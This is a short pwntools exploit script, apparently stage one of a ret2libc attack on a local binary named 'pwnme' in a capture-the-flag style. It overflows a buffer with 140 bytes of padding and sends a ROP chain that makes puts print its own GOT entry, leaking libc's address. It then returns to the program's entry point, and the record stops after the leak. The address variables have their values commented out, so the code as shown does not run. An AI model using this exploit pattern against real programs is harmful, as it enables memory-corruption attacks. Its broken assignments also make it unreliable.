from pwn import *

# Addresses
puts_plt = #0x8048390
puts_got = #0x804a014
entry_point = #0x080483d0

# context.log_level = "debug"

def main():
    
    # open process
    p = process("./pwnme")

    # Stage 1
    
    # Initial payload
    payload  =  "A"*140 # padding
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload.encode() + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info("puts is at: 0x%x" % leak)
    p.clean()
  

if __name__ == "__main__":
    main()

